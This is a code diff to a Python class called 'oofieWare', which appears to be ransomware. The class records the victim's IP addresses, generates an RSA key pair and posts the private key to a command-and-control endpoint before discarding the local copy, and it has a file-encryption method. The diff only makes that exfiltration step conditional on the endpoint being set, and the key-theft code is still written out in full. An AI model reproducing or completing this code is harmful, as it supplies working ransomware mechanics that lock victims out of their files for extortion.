@@ -33,7 +33,7 @@ class oofieWare:
         self.PUBLIC_IP = requests.get('https://api.ipify.org').text
         self.PRIVATE_IP = socket.gethostbyname(socket.gethostname())
         
-        self.ENDPOINT = "<command and control server>"
+        self.ENDPOINT = None # <command and control server>
 
         if gen_rsa:
             self.privKey = None
@@ -59,11 +59,12 @@ class oofieWare:
         keyPair = RSA.generate(4096)
         self.privKey = keyPair.export_key()
         self.pubKey = keyPair.publickey()
-        requests.post(self.ENDPOINT, data=json.dumps({
-            "PUBLIC_IP": self.PUBLIC_IP,
-            "PRIVATE_IP": self.PRIVATE_IP,
-            "PRIVATE_KEY": self.privKey
-        }), headers={"Content-Type" : "application/json"})
+        if self.ENDPOINT:
+            requests.post(self.ENDPOINT, data=json.dumps({
+                "PUBLIC_IP": self.PUBLIC_IP,
+                "PRIVATE_IP": self.PRIVATE_IP,
+                "PRIVATE_KEY": self.privKey
+            }), headers={"Content-Type" : "application/json"})
         self.privKey = None
 
     def crypt_file(self, file_path):
